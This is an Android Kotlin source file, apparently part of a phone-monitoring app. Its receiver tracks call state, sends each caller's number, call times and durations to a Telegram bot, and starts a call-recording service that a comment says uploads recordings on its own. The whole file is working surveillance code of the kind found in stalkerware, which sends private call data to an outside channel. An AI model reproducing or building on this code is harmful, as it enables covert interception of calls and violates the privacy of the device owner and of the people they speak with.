package com.dec.monitor.call

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class CallReceiver : BroadcastReceiver() {

    companion object {
        var lastState = TelephonyManager.EXTRA_STATE_IDLE
        var callStartTime = 0L
        var currentNumber = "unknown"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            ?: intent.getStringExtra("incoming_number")
            ?: "unknown"

        when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                currentNumber = number
                val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                CoroutineScope(Dispatchers.IO).launch {
                    TelegramBot.sendMessage("📞 <b>Incoming Call</b>\nFrom: <code>$number</code>\nTime: $time")
                }
            }

            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                if (lastState == TelephonyManager.EXTRA_STATE_RINGING) {
                    callStartTime = System.currentTimeMillis()
                    val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                    CoroutineScope(Dispatchers.IO).launch {
                        TelegramBot.sendMessage("✅ <b>Call Answered</b>\nNumber: <code>$currentNumber</code>\nTime: $time")
                    }
                    // start recording
                    val serviceIntent = Intent(context, CallRecordingService::class.java)
                    serviceIntent.putExtra("number", currentNumber)
                    context.startForegroundService(serviceIntent)
                }
            }

            TelephonyManager.EXTRA_STATE_IDLE -> {
                if (lastState != TelephonyManager.EXTRA_STATE_IDLE) {
                    val duration = if (callStartTime > 0)
                        ((System.currentTimeMillis() - callStartTime) / 1000).toString() + "s"
                    else "0s"
                    callStartTime = 0L

                    val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                    CoroutineScope(Dispatchers.IO).launch {
                        TelegramBot.sendMessage("🔴 <b>Call Ended</b>\nNumber: <code>$currentNumber</code>\nDuration: $duration\nTime: $time")
                    }
                    // stop recording service — it uploads on its own
                    context.stopService(Intent(context, CallRecordingService::class.java))
                }
            }
        }

        lastState = state
    }
}
